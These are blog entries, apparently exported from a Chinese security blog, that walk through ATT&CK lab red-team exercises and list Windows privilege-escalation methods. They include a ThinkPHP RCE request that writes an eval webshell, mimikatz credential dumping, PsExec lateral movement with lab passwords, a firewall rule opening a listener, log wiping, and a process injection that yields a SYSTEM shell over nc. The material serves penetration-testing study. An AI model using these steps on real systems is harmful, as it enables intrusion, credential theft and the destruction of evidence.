<p>​      <code>exploit/windows/smb/psexec</code>远程连接即可拿到shell，并且是管理员权限。</p>
<p>​      <a href="https://www.freebuf.com/articles/system/183670.html" target="_blank" rel="noopener">多种使用SMB端口远程连接PC的方法介绍 </a></p>
<ul>
<li><strong>植入后门</strong></li>
<li><strong>痕迹清理</strong></li>
</ul>
<h3 id="红队评估（二）"><a href="#红队评估（二）" class="headerlink" title="红队评估（二）"></a>红队评估（二）</h3><h5 id="详细教程"><a href="#详细教程" class="headerlink" title="详细教程"></a>详细教程</h5><p><a href="https://www.anquanke.com/post/id/193193" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193193</a></p>
<p><a href="https://wh0ale.github.io/2019/12/11/VulnStack" target="_blank" rel="noopener">https://wh0ale.github.io/2019/12/11/VulnStack</a></p>
<h5 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">内网网段：<span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>/<span class="number">24</span></span><br><span class="line">DC</span><br><span class="line">IP：<span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span>OS：Windows <span class="number">2012</span>(<span class="number">64</span>)</span><br><span class="line">应用：AD域</span><br><span class="line">WEB</span><br><span class="line">IP1：<span class="number">10.10</span><span class="number">.10</span><span class="number">.80</span></span><br><span class="line">应用：Weblogic <span class="number">10.3</span><span class="number">.6</span>MSSQL <span class="number">2008</span></span><br><span class="line">PC</span><br><span class="line">IP1：<span class="number">10.10</span><span class="number">.10</span><span class="number">.201</span></span><br></pre></td></tr></table></figure>

<p>大体拓扑如下：</p>
<p><img src="/2020/06/05/hong-ri-an-quan-att-ck-ba-chang-zong-jie/t01bbcd3ad3d53a0ecd.jpg" alt="img"></p>
<h4 id="外网渗透-1"><a href="#外网渗透-1" class="headerlink" title="外网渗透"></a>外网渗透</h4><ul>
<li><p><strong>首先手动开启web机上weblogic服务，访问web机的7001端口。可以进入控制台。</strong></p>
</li>
<li><p><strong>使用WeblogicScan进行扫描，由扫描结果可知存在CVE-2019-2725</strong>。</p>
<p><a href="https://github.com/dr0op/WeblogicScan" target="_blank" rel="noopener">https://github.com/dr0op/WeblogicScan</a></p>
<p><a href="https://www.cnblogs.com/-mo-/p/11503707.html" target="_blank" rel="noopener">Weblogic漏洞总结</a></p>
</li>
<li><p><strong>使用<code>CVE-2019-2725</code>的POC上传webshell，</strong></p>
</li>
</ul>
<p>​    <a href="https://www.cnblogs.com/liliyuanshangcao/p/10820583.html" target="_blank" rel="noopener"><a href="https://www.cnblogs.com/liliyuanshangcao/p/10820583.html" target="_blank" rel="noopener">（CVE-2019-2725）复现</a></a></p>
<ul>
<li><strong>或者直接使用msf自带的cve模块打一波，拿到shell.</strong></li>
<li><strong>或者使用这个脚本</strong>：<a href="https://github.com/TopScrew/CVE-2019-2725" target="_blank" rel="noopener">https://github.com/TopScrew/CVE-2019-2725</a></li>
</ul>
<h4 id="内网渗透-1"><a href="#内网渗透-1" class="headerlink" title="内网渗透"></a>内网渗透</h4><ul>
<li><p><strong>后渗透常规操作走一波</strong></p>
<ul>
<li>查看用户权限，这里已经是管理员权限，暂不提权。</li>
<li>查看主机信息和开放端口</li>
<li>新建管理员用户，远程桌面登录。</li>
<li>因为这里靶机安装了360，所以需要上传procdump结合mimikatz在本地读取密码信息</li>
</ul>
<p>​      <a href="https://www.cnblogs.com/nul1/p/9285814.html" target="_blank" rel="noopener">利用procdump+Mimikatz 绕过杀软获取Windows明文密码</a></p>
<ul>
<li>最后使用msf生成个后门。</li>
</ul>
<p>​     <a href="https://www.freebuf.com/articles/web/180581.html" target="_blank" rel="noopener">后渗透阶段的权限维持（Windows篇） </a></p>
</li>
<li><p><strong>后渗透信息收集，收集域内信息，添加域管理员账号，定位域控</strong>。</p>
</li>
<li><p><strong>msf添加路由，搭建代理。</strong></p>
<p><a href="https://blog.csdn.net/God_XiangYu/article/details/100115657" target="_blank" rel="noopener">reDuh搭建HTTP正向代理</a></p>
<p><a href="https://blog.csdn.net/God_XiangYu/article/details/100132929" target="_blank" rel="noopener">ssocks+proxychains搭建代理</a></p>
<p><a href="https://blog.csdn.net/God_XiangYu/article/details/100126207" target="_blank" rel="noopener">reGeorg + proxifier搭建SOCKS正向代理</a></p>
<p><a href="https://blog.csdn.net/God_XiangYu/article/details/100129295" target="_blank" rel="noopener">xsocks+proxychains搭建代理</a></p>
<p><a href="https://blog.csdn.net/God_XiangYu/article/details/100123395" target="_blank" rel="noopener">tunna搭建HTTP正向代理</a></p>
</li>
<li><p><strong>刚刚已经拿到了域管理权限知道密码，直接用psexec连接域控制器拿下域控。</strong></p>
</li>
<li><p><strong>痕迹清理</strong></p>
<ul>
<li><p>获取日志分类列表：wevtutil el &gt;1.txt</p>
</li>
<li><p>获取单个日志类别的统计信息：wevtutil gli “windows powershell”</p>
</li>
<li><p>查看指定日志的具体内容：wevtutil qe /f:text “windows powershell”</p>
</li>
<li><p>删除单个日志类别的所有信息：wevtutil cl “windows powershell”</p>
</li>
<li><p><strong>破坏Windows日志记录功能</strong> </p>
<ul>
<li><a href="https://github.com/hlldz/Invoke-Phant0m" target="_blank" rel="noopener">Invoke-Phant0m</a></li>
<li><a href="https://github.com/3gstudent/Windwos-EventLog-Bypass" target="_blank" rel="noopener">Windwos-EventLog-Bypass</a></li>
</ul>
</li>
<li><p><strong>msf</strong>  run clearlogs   clearev</p>
</li>
</ul>
</li>
</ul>
<h3 id="红队实战（三）"><a href="#红队实战（三）" class="headerlink" title="红队实战（三）"></a>红队实战（三）</h3><h5 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h5><p><img src="/2020/06/05/hong-ri-an-quan-att-ck-ba-chang-zong-jie/20191223205755-d65c291e-2583-1.png" alt="img"></p>
<h4 id="外网渗透-2"><a href="#外网渗透-2" class="headerlink" title="外网渗透"></a>外网渗透</h4><ul>
<li><p><strong>首先发现80端口网站是个joomla!，探测版本，发现是3.9.2较高的版本。</strong></p>
<ul>
<li><a href="https://github.com/rezasp/joomscan" target="_blank" rel="noopener">JoomScan开源扫描器</a></li>
<li><a href="https://www.anquanke.com/post/id/188177" target="_blank" rel="noopener">Joomla 3.4.6远程代码执行漏洞原理分析和poc</a></li>
<li><a href="https://blog.csdn.net/m0_37438418/article/details/80976593" target="_blank" rel="noopener">Joomla漏洞</a></li>
</ul>
</li>
<li><p><strong>然后扫了下目录，发现存在备份的配置文件configuration.php。</strong></p>
</li>
<li><p><strong>在配置文件中得到了一个mysql普通数据库用户</strong></p>
</li>
</ul>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">testuser cvcvgjASD!@</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>探测端口发现3306开放，尝试使用拿到的mysql密码登录</strong></p>
</li>
<li><p><strong>登录成功，拿到了joomla!的数据库，尝试添加管理员 admin2</strong> </p>
</li>
<li><p><strong>使用账号admin2 secret登录后台：<a href="http://192.168.1.110/administrator/index.php" target="_blank" rel="noopener">http://192.168.1.110/administrator/index.php</a></strong></p>
</li>
<li><p><strong>通过模板修改，getshell。然后访问shell。</strong></p>
</li>
<li><p><strong>这里得绕一下disable_function。可以用LD_PRELOAD绕过。</strong></p>
<ul>
<li><a href="https://xz.aliyun.com/t/5320" target="_blank" rel="noopener">PHP Webshell下绕过disable_function的方法</a></li>
</ul>
</li>
<li><p>在ubuntu上找到了个test.txt，存放着应该是账号密码。</p>
</li>
<li><p>尝试使用wwwuser通过ssh登陆192.168.1.110</p>
</li>
</ul>
<h4 id="内网渗透-2"><a href="#内网渗透-2" class="headerlink" title="内网渗透"></a>内网渗透</h4><ul>
<li><p>上msf，scp上传payload到centos，centos执行payload获取shell。</p>
<p><a href="https://www.cnblogs.com/tugenhua0707/p/8278772.html" target="_blank" rel="noopener">[scp传输文件的命令]</a></p>
</li>
<li><p>添加路由,使用msf扫描获取周围windows信息。</p>
<p>​    <a href="https://www.cnblogs.com/Hi-blog/p/7413406.html#autoid-5-3-0" target="_blank" rel="noopener">MSF的辅助扫描模块（信息搜集）</a></p>
</li>
<li><p>得到了三台加入test域的windows主机</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">192.168.93.20 windows<span class="built_in"> server </span>2008</span><br><span class="line"></span><br><span class="line">192.168.93.30 windows 7</span><br><span class="line"></span><br><span class="line">192.168.93.10 windows<span class="built_in"> server </span>2012</span><br></pre></td></tr></table></figure>
</li>
<li><p>尝试爆破一下windows server 2008的本地管理员，得到了本地管理员的密码：123qwe!ASD</p>
</li>
<li><p>搭建目标网络代理，kali使用proxychains来代理socs4a。</p>
</li>
<li><p>用<a href="https://github.com/ropnop/impacket_static_binaries" target="_blank" rel="noopener">wmiexec</a>执行命令，使用得到的密码远程连接目标机器</p>
<p>​    <a href="http://www.91ri.org/12908.html" target="_blank" rel="noopener">利用WMI代替psexec（WMIEXEC.vbs）</a></p>
<p>​    <a href="https://www.cnblogs.com/ssooking/articles/6082407.html" target="_blank" rel="noopener">丢掉PSEXEC来横向渗透</a></p>
</li>
<li><p>查看进程时发现有test域的administrator的进程，于是尝试抓一下密码</p>
</li>
<li><p>kali下使用smbclient通过代理连接windows server 2008 上传mimikatz。</p>
<p>​    <a href="[https://www.marksec.org/2019/04/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bsmbclient%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/](https://www.marksec.org/2019/04/10/内网渗透之smbclient工具学习/)">内网渗透之smbclient工具学习</a></p>
</li>
<li><p>wmiexec远程执行mimikatz抓到了test域的administrator密码。</p>
<p><a href="https://cloud.tencent.com/developer/article/1171183" target="_blank" rel="noopener">九种姿势运行Mimikatz</a></p>
</li>
<li><p>查看windows server 2008的ip，然后ping test.org获取到域控制器ip</p>
</li>
<li><p>直接ipc连接（环境有点问题，3389连接域控提示administrator的密码过期了）</p>
</li>
<li><p>得到重要文件flag.txt。</p>
</li>
</ul>
<h3 id="红队评估（五）"><a href="#红队评估（五）" class="headerlink" title="红队评估（五）"></a>红队评估（五）</h3><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><p><strong>Win7 +phpstudy+thinkphp（5.0.22）</strong> </p>
<p>ip  192.168.135.150</p>
<p>ip  192.168.138.136</p>
<p><strong>Win2008</strong>     </p>
<p>ip 192.168.138.138</p>
<p><strong>攻击机 win10</strong>     </p>
<p>ip  192.168.135.143</p>
<h4 id="外网渗透-3"><a href="#外网渗透-3" class="headerlink" title="外网渗透"></a>外网渗透</h4><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
<li><p><strong>漏洞搜索与利用，浏览器访问192.168.135.150，发现是thinkphp框架，爆下错，看下tp版本为5.0.22。</strong></p>
<ul>
<li><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection" target="_blank" rel="noopener">thinkphp v5.x 远程代码执行漏洞-POC集合</a></li>
</ul>
</li>
<li><p><strong>找到此版本的poc,然后写一句话木马。</strong></p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">135.150</span>/?<span class="keyword">s</span>=<span class="keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="number">0</span>]=<span class="keyword">system</span>&amp;vars[<span class="number">1</span>][]=echo%20^%3C?php%20@eval($_POST[%27cmd%27]);%20?^%3E%20%3E%20C:\phpStudy\PHPTutorial\WWW\public\shell.php</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>蚁剑连接，查看权限，发现居然是域管理员权限！！！</strong></p>
</li>
</ul>
<h4 id="内网渗透-3"><a href="#内网渗透-3" class="headerlink" title="内网渗透"></a>内网渗透</h4><ul>
<li><p><strong>在横向移动前我们需要收集域内信息。</strong></p>
<ul>
<li>内网网段:192.168.138.0/24</li>
<li>域控ip：192.168.138.138（DNS服务器确定),域名：sun.com</li>
<li>域用户:admin Administrator krbtgt leo</li>
</ul>
</li>
<li><p><strong>接下来使用CS来完成后续内网渗透工作。</strong></p>
<p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0用户手册_中文翻译.pdf" target="_blank" rel="noopener">Cobaltstrike用户手册</a></p>
</li>
<li><p><strong>首先使用创建监听器，然后根据需要生成对应监听器的木马，这里我选择生成windows的exe木马。</strong></p>
</li>
</ul>
<p>​       <a href="https://zhuanlan.zhihu.com/p/93718885" target="_blank" rel="noopener">Cobalt Strike简介及生成简易木马</a></p>
<ul>
<li><p><strong>使用蚁剑上传到目标服务器，执行，查看cs发现，win7已上线。</strong></p>
</li>
<li><p><strong>这里看到上线的用户的只是administrator权限，直接使用cs自带的ms14-058提权（为什么用它提权，因为靶场里提示了。。）</strong></p>
<p><a href="https://www.freebuf.com/vuls/48239.html" target="_blank" rel="noopener">Win64bit提权0day漏洞（CVE-2014-4113）</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/94135740" target="_blank" rel="noopener">Beacon详解</a></p>
</li>
<li><p><strong>选择提权后，一会就可以看到system权限的win7上线。</strong></p>
</li>
<li><p><strong>选择system权限win7,进入Beacon,然后运行mimikatz读到了Administrator和leo的密码</strong></p>
</li>
<li><p><strong>因为我们这里已经得到的域控管理员的密码，所以直接找域控登录即可</strong>。</p>
</li>
<li><p><strong>使用CS扫一下内网可以用psexec登录的主机，主要看445端口有没有开放</strong>。</p>
</li>
<li><p><strong>因为我们这里的DC处于内网，不能直接连接CS,所以我们需要win7做一个跳板机器</strong>。</p>
</li>
<li><p><strong>在win7上设置新的监听，上传psexec，设置防火墙规则。</strong></p>
<ul>
<li><pre><code>netsh advfirewall firewall add rule name=cs dir=in action=allow protocol=TCP localport=6666
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>*<span class="strong">*最后使用PsExec登录DC域控。*</span><span class="strong">*</span></span><br><span class="line"><span class="strong"></span></span><br><span class="line"><span class="strong">  -</span></span><br></pre></td></tr></table></figure>
Shell C:\phpStudy\PHPTutorial\WWW\public\PsExec64.exe -accepteula \\192.168.138.138 -u sun\Administrator -p dc123.com -d -c C:\phpStudy\PHPTutorial\WWW\public\nei.exe</code></pre></li>
</ul>
</li>
<li><p><strong>此时可以看到dc主机也已经上线</strong></p>
</li>
<li><p><strong>日志和入侵痕迹清除，主要是我们上传的木马文件，添加的管理员。以及系统日志、web应用日志、防火墙日志等内容。</strong></p>
<ul>
<li><a href="https://blog.csdn.net/God_XiangYu/article/details/100056932" target="_blank" rel="noopener">后渗透篇：清理windows入侵痕迹总结</a></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>内网与域渗透学习</category>
      </categories>
      <tags>
        <tag>ATT&amp;CK</tag>
      </tags>
  </entry>
  <entry>
    <title>windows中常见提权方式总结(一)</title>
    <url>/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/</url>
    <content><![CDATA[<h2 id="渗透测试中常见提权方式总结（一）"><a href="#渗透测试中常见提权方式总结（一）" class="headerlink" title="渗透测试中常见提权方式总结（一）"></a>渗透测试中常见提权方式总结（一）</h2><h3 id="windows提权——本地提权"><a href="#windows提权——本地提权" class="headerlink" title="windows提权——本地提权"></a>windows提权——本地提权</h3><ul>
<li>已实现本地低权限账号登录<ul>
<li>远程溢出</li>
<li>直接获得账号密码</li>
</ul>
</li>
<li>希望获得更高权限<ul>
<li>实现对目标进一步控制</li>
</ul>
</li>
<li>系统账号之间权限隔离<ul>
<li>操作系统安全的基础</li>
<li>用户空间</li>
<li>内核空间</li>
</ul>
</li>
<li>系统账号<ul>
<li>用户账号登录时获取权限令牌</li>
<li>服务账号无需用户登录已在后台启动服务</li>
</ul>
</li>
<li>Windows<ul>
<li>users</li>
<li>Administrator</li>
<li>System</li>
</ul>
</li>
</ul>
<h4 id="Windows系统提权"><a href="#Windows系统提权" class="headerlink" title="Windows系统提权"></a>Windows系统提权</h4><h5 id="1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）"><a href="#1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）" class="headerlink" title="1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）"></a>1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改密码：net user kevin *</span></span><br><span class="line">C:\Documents <span class="keyword">and</span> Settings\kevin&gt;net<span class="built_in"> user </span>kevin *</span><br><span class="line"><span class="built_in">	Type </span>a password <span class="keyword">for</span> the user:</span><br><span class="line">	Retype the password <span class="keyword">to</span> confirm:</span><br><span class="line">	The command completed successfully.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看系统用户：net user</span></span><br><span class="line">C:\Documents <span class="keyword">and</span> Settings\kevin&gt;net user</span><br><span class="line"><span class="built_in">	User </span>accounts <span class="keyword">for</span> \\DH-CA8822AB9589</span><br><span class="line">	---------------------------------------------------------------------</span><br><span class="line">	Administrator            Guest                    HelpAssistant</span><br><span class="line">	IUSR_DH-CA8822AB9589     IWAM_DH-CA8822AB9589     kevin</span><br><span class="line">	SUPPORT_388945a0</span><br><span class="line">	The command completed successfully.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看用户状态：</span></span><br><span class="line">C:\Documents <span class="keyword">and</span> Settings\kevin&gt;net<span class="built_in"> user </span>kevin</span><br><span class="line"><span class="built_in">	User </span>name                    kevin</span><br><span class="line">	Full Name                    kevin</span><br><span class="line">	Comment</span><br><span class="line">	User<span class="string">'s comment</span></span><br><span class="line"><span class="string">	Country code                 000 (System Default)</span></span><br><span class="line"><span class="string">	Account active               Yes</span></span><br><span class="line"><span class="string">	Account expires              Never</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	Password last set            2/28/2018 2:05 PM</span></span><br><span class="line"><span class="string">	Password expires             Never</span></span><br><span class="line"><span class="string">	Password changeable          2/28/2018 2:05 PM</span></span><br><span class="line"><span class="string">	Password required            Yes</span></span><br><span class="line"><span class="string">	User may change password     Yes</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	Workstations allowed         All</span></span><br><span class="line"><span class="string">	Logon script</span></span><br><span class="line"><span class="string">	User profile</span></span><br><span class="line"><span class="string">	Home directory</span></span><br><span class="line"><span class="string">	Last logon                   2/28/2018 2:03 PM</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	Logon hours allowed          All</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	Local Group Memberships      *Administrators       *Users</span></span><br><span class="line"><span class="string">	Global Group memberships     *None</span></span><br><span class="line"><span class="string">	The command completed successfully.</span></span><br></pre></td></tr></table></figure>

<p>1.查看用户进程</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200427202422.png" alt></p>
<p>2.将 administrator 用户权限提升为 system 权限</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\administrator&gt;cd \</span><br><span class="line">C:\&gt;at -?</span><br><span class="line">C:\&gt;at 2:15 /interactive cmd  #必须是未来时间，否则将是明天时间</span><br><span class="line"><span class="code">	Added a new job with job ID = 1</span></span><br><span class="line">C:\&gt;at</span><br><span class="line">Status ID   Day                     Time          Command Line</span><br><span class="line">---------------------------------------------------------------------</span><br><span class="line"><span class="code">        1   Today 	                2:15 AM       cmd</span></span><br></pre></td></tr></table></figure>

<p>我们看到这里弹出了system权限的命令框</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200427203025.png" alt></p>
<p>3.用新的 system 权限的窗口启动任务管理器</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">C:<span class="symbol">\W</span>INDOWS<span class="symbol">\s</span>ystem32&gt;taskmgr</span><br></pre></td></tr></table></figure>

<p>4.关闭之前的explorer</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200427203207.png" alt></p>
<p>5.应用程序-&gt;新任务-&gt;explorer</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200427203207.png" alt></p>
<p>6.验证桌面用户权限</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200427203521.png" alt></p>
<h5 id="2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本"><a href="#2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本" class="headerlink" title="2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)"></a>2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)</h5><p>1.运行-&gt;services.msc</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">- C:\Users\root&gt;<span class="built_in">cd</span> \</span><br><span class="line">- C:&gt;sc Create syscmd binPath= “<span class="built_in">cmd</span> /K <span class="built_in">start</span>” <span class="built_in">type</span>= own <span class="built_in">type</span>= interact</span><br><span class="line">- C:&gt;sc <span class="built_in">start</span> syscmd</span><br></pre></td></tr></table></figure>

<p>3.使用 Sysinternals Suite 套件</p>
<p>推荐书籍 《Windows Internals第7版》</p>
<p><a href="https://download.sysinternals.com/files/SysinternalsSuite.zip" target="_blank" rel="noopener">Sysinternals Suite 套件下载</a></p>
<ul>
<li><p>下载之后解压使用其中的 PsExec 放在C盘根目录</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200427205521.png" alt></p>
</li>
<li><p>启动 PsExec.exe</p>
</li>
</ul>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">C</span>:\&gt;PsExec.exe</span><br><span class="line"><span class="attribute">-i</span>: 交互模式</span><br><span class="line"><span class="attribute">-s</span>: 使用系统账户</span><br><span class="line"></span><br><span class="line"><span class="attribute">C</span>:\&gt;psexec -p'sei -s -d taskmgr</span><br><span class="line"><span class="attribute">C</span>:\&gt;PsExec.exe -i -s cmd</span><br></pre></td></tr></table></figure>

<ul>
<li>提权结果</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200427205652.png" alt></p>
<h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4><ul>
<li>pinjector.exe</li>
</ul>
<p>下载：<a href="https://www.tarasco.org/security/Process_Injector/：" target="_blank" rel="noopener">https://www.tarasco.org/security/Process_Injector/：</a></p>
<ul>
<li>下载之后解压使用其中的 PsExec 放在C盘根目录</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200427205858.png" alt></p>
<ul>
<li>列出可注入进程及其信息<ul>
<li>C:&gt;pinjector.exe</li>
<li>C:&gt;pinjector.exe -l</li>
</ul>
</li>
<li>找一个未使用端口<ul>
<li>C:&gt;netstat -nao | find “4444” </li>
<li>无结果表示未使用</li>
</ul>
</li>
<li>选择一个进程注入</li>
</ul>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">C</span>:\&gt;pinjector.exe -l</span><br><span class="line">	PID    <span class="number">668</span> services.exe ( <span class="number">16</span> Threads)  <span class="attribute">USER</span>: \\NT AUTHORITY\SYSTEM</span><br><span class="line"><span class="attribute">C</span>:\&gt;pinjector.exe -p <span class="number">668</span> cmd <span class="number">4444</span></span><br><span class="line">	Privilege Switcher for Win32(Private version)</span><br><span class="line">	(c) <span class="number">2006</span> Andres Tarasco - atarasco<span class="variable">@gmail</span>.com</span><br><span class="line">	[+] Trying to execute cmd to <span class="number">668</span> <span class="attribute">as</span>: ? \</span><br><span class="line">	[+] Code inyected... ; )</span><br></pre></td></tr></table></figure>

<ul>
<li>查看被注入的进程的监听状态</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">C:\&gt;netstat -nao | find <span class="string">"555"</span></span><br><span class="line">	TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">555</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">668</span></span><br></pre></td></tr></table></figure>

<ul>
<li>利用此监听端口</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">root@kali：~#</span> <span class="string">nc</span> <span class="string">-nv</span> <span class="number">192.168</span><span class="number">.153</span><span class="number">.143</span> <span class="number">4444</span></span><br><span class="line">	<span class="string">Connection</span> <span class="string">to</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.128</span> <span class="number">555</span> <span class="string">port</span> <span class="string">[tcp/*]</span> <span class="string">succeeded!</span></span><br><span class="line">	<span class="string">Microsoft</span> <span class="string">Windows</span> <span class="string">XP</span> <span class="string">[?汾</span> <span class="number">5.1</span><span class="number">.2600</span><span class="string">]</span></span><br><span class="line">	<span class="string">(C)</span> <span class="string">???????</span> <span class="number">1985</span><span class="number">-2001</span> <span class="string">Microsoft</span> <span class="string">Corp</span></span><br><span class="line"><span class="string">C:\WINDOWS\system32&gt;whoami</span></span><br><span class="line">	<span class="string">whoami</span></span><br><span class="line">	<span class="string">SYSTEM</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查看进程</li>
</ul>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">使用 SysinternalsSuite/procexp<span class="selector-class">.exe</span> 查看进程</span><br></pre></td></tr></table></figure>

<h4 id="读取windows本地密码进行提权"><a href="#读取windows本地密码进行提权" class="headerlink" title="读取windows本地密码进行提权"></a>读取windows本地密码进行提权</h4><h5 id="1-抓包嗅探"><a href="#1-抓包嗅探" class="headerlink" title="1. 抓包嗅探"></a>1. 抓包嗅探</h5><ol>
<li>Windows<ul>
<li>Wireshark</li>
<li>Omnipeek</li>
<li>Commview</li>
<li>Sniffpass：抓取密码相关的数据包</li>
</ul>
</li>
<li>Linux<ul>
<li>Tcpdump</li>
<li>Wireshark</li>
<li>Dsniff：抓取密码相关的数据包</li>
</ul>
</li>
</ol>
<h5 id="2-键盘记录本地密码"><a href="#2-键盘记录本地密码" class="headerlink" title="2. 键盘记录本地密码"></a>2. 键盘记录本地密码</h5><ul>
<li>可以使用木马软件 DarkCometRAT</li>
<li>在控制目标主机之后可以监控键盘记录信息</li>
</ul>
<h5 id="3-查看本地缓存密码"><a href="#3-查看本地缓存密码" class="headerlink" title="3.查看本地缓存密码"></a>3.查看本地缓存密码</h5><ul>
<li><p>在浏览器查看缓存密码</p>
</li>
<li><p>windows 密码恢复工具</p>
<ul>
<li><a href="http://www.nirsoft.net/password_recovery_tools.html" target="_blank" rel="noopener">Windows Password Recovery Tools</a></li>
</ul>
</li>
<li><p>使用 Pwdump 查看 windows 本地登录密码</p>
